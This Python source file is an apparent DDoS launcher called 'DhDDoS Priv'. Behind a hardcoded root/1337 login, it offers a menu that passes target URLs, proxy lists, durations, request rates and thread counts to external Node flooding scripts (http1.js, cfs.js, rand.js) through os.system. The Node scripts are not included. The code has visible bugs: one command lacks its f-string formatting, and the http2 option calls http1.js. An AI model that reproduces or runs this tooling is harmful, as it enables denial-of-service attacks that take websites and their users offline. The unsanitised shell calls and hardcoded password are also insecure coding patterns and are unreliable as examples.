import os
import getpass

usernm="root"
passwd="1337"
baner="""


   @@@@@@@  @@@  @@@      @@@@@@@  @@@@@@@   @@@@@@   @@@@@@
   @@!  @@@ @@!  @@@      @@!  @@@ @@!  @@@ @@!  @@@ !@@    
   @!@  !@! @!@!@!@!      @!@  !@! @!@  !@! @!@  !@!  !@@!! 
   !!:  !!! !!:  !!!      !!:  !!! !!:  !!! !!:  !!!     !:!
   :: :  :   :   : :      :: :  :  :: :  :   : :. :  ::.: : 
                                                          
                [ DhDDoS Priv - Dimas Ham ]

  ╔═══[ Menu ]═════════════════════════════════════════════╗
  ║                                                        ║
  ║ • http1                     •                          ║
  ║ • http2                     •                          ║
  ║ • cfs                       •                          ║
  ║ • rand                      •                          ║
  ╚════════════════════════════════════════════════════════╝
"""

def hapus():
	os.system('cls' if os.name == 'nt' else 'clear')


def key():
	print("\n [ Login Tools ]\n")
	user=input(" Username : ")
	passs=getpass.getpass(prompt=' Password: ')
	if user == usernm and passs == passwd:
		hapus()
		menu()

def menu():
	print (baner)
	while(True):
		dh=input("╔══[ DhDDoS ]\n╚═>> ")
		if "http1" in dh:
			try:
				mode = dh.split()[1]
				host = dh.split()[2]
				proxi = dh.split()[3]
				durasi = dh.split()[4]
				rate = dh.split()[5]
				threads = dh.split()[6]
				options = dh.split()[7]
				os.system(f'node http1.js {mode} {host} {proxi} {durasi} {rate} {threads} {options}')
			except:
				print('Usage: http1 <MODE> <host> <proxies> <duration> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="")')
				print('Example: http1 GET http://site.com proxy.txt 60 2500 100 randomstring')

		elif "cfs" in dh:
			try:
				target = dh.split()[1]
				time = dh.split()[2]
				threads = dh.split()[3]
				method = dh.split()[4]
				proxi = dh.split()[5]
				reqip = dh.split()[6]
				os.system('node cfs.js {target} {time} {threads} {method} {proxi} {reqip}')
			except:
				print('Usage: cfs <Target> <Time> <Threads> <Method> <Proxy List> <Requests Per IP>')
				print('cfs http://site.com 60 100 GET proxy.txt 5000')

		elif "http2" in dh:
			try:
				mode = dh.split()[1]
				host = dh.split()[2]
				proxi = dh.split()[3]
				durasi = dh.split()[4]
				rate = dh.split()[5]
				threads = dh.split()[6]
				options = dh.split()[7]
				os.system(f'node http1.js {mode} {host} {proxi} {durasi} {rate} {threads} {options}')
			except:
				print('Usage: http2 <MODE> <host> <proxies> <duration> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="")')
				print('Example: http1 GET http://site.com proxy.txt 60 2500 100 randomstring')

		elif "rand" in dh:
			try:
				url = dh.split()[1]
				time = dh.split()[2]
				os.system(f"node rand.js {url} {time}")
			except:
				print("Usage: rand <url> <time>")
				print("Example: rand <http://example.com> <60>")


if __name__ == '__main__':
	key()
